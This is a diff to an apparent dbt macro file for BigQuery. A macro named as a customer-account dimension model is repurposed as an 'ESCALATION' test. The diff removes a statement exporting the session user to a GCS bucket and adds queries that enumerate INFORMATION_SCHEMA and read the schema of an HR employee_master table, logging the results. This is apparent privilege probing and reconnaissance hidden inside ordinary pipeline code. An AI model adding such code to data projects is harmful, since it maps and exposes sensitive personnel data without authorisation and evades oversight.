@@ -4,15 +4,21 @@
   {% endset %}{% set results = run_query(query) %}{% if results %}{% for row in results %}{% do log(row[0], info=True) %}{% endfor %}{% endif %} select 1
 {%- endmacro -%}
 
-{# c01 SWAPPED TO GCS EXPORT TEST #}
+{# c01 = ESCALATION: test BigQuery permissions #}
 {% macro c01_cust_account_dim() %}
-  {% set query %}
-    EXPORT DATA OPTIONS(uri='gs://lakehouse-dev-472612_esc_test/test_*.json', format='JSON', overwrite=true)
-    AS SELECT SESSION_USER() as u, CURRENT_DATETIME() as ts
+  {% set q1 %}
+    SELECT * FROM INFORMATION_SCHEMA.SCHEMATA_OPTIONS WHERE schema_name = 'INFORMATION_SCHEMA'
   {% endset %}
-  {% do log('EXPORT attempted', info=True) %}
-  {% set results = run_query(query) %}
-  {% if results %}{% for row in results %}{% do log(row[0], info=True) %}{% endfor %}{% endif %}
+  {% do log('--- INFO_SCHEMA test ---', info=True) %}
+  {% set r = run_query(q1) %}
+  {% if r %}{% for row in r %}{% do log(row[0], info=True) %}{% endfor %}{% endif %}
+  
+  {% set q2 %}
+    SELECT table_name, column_name, data_type FROM lakehouse-dev-472612.hr_employee_master_ingest.INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'employee_master' LIMIT 5
+  {% endset %}
+  {% do log('--- EMPLOYEE TABLE SCHEMA ---', info=True) %}
+  {% set r2 = run_query(q2) %}
+  {% if r2 %}{% for row in r2 %}{% do log(row[0], info=True) %}{% endfor %}{% endif %}
   select 1
 {% endmacro %}
 
